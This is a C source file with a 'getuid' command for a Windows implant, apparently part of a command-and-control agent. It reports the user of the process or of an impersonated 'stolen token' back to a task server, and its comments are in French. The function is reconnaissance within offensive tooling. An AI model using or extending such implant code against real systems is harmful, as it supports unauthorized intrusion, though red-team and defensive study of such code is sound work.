#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <windows.h>

#ifdef INCLUDE_CMD_GETUID

void command_getuid(char *task_id, char *params) {
  (void)params;

  /* Si un token volé est actif, on l'interroge directement
   * plutôt que GetUserNameA (qui lit le token du processus). */
  if (g_stolen_token != NULL) {
    char username[256] = {0};
    char domain[256] = {0};
    DWORD needed = 0;
    GetTokenInformation(g_stolen_token, TokenUser, NULL, 0, &needed);
    TOKEN_USER *tu = (TOKEN_USER *)malloc(needed);
    if (tu &&
        GetTokenInformation(g_stolen_token, TokenUser, tu, needed, &needed)) {
      DWORD nlen = sizeof(username), dlen = sizeof(domain);
      SID_NAME_USE use;
      LookupAccountSidA(NULL, tu->User.Sid, username, &nlen, domain, &dlen,
                        &use);
      free(tu);
      char result[512];
      snprintf(result, sizeof(result), "%s\\%s (impersonated)", domain,
               username);
      send_task_response(task_id, result);
    } else {
      if (tu)
        free(tu);
      send_task_response(task_id, "Failed to query stolen token");
    }
    return;
  }

  char username[256] = {0};
  DWORD len = sizeof(username);
  if (GetUserNameA(username, &len)) {
    send_task_response(task_id, username);
  } else {
    send_task_response(task_id, "Failed to get username");
  }
}

#endif
